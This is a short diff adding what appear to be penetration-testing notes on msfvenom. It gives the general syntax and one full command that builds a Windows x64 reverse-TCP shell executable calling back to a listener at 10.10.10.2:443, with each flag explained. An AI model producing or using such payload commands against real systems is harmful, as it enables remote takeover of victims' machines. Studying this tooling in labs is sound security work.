@@ -1,0 +1,4 @@
+One-stop shop for payload creation.
+
+msfvenom -p <payload> <options> 
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.2 LPORT=443 -> -p select payload -f file type to embed payload as -o output filename LHOST/LPORT Listener's IP/PORT to connect to
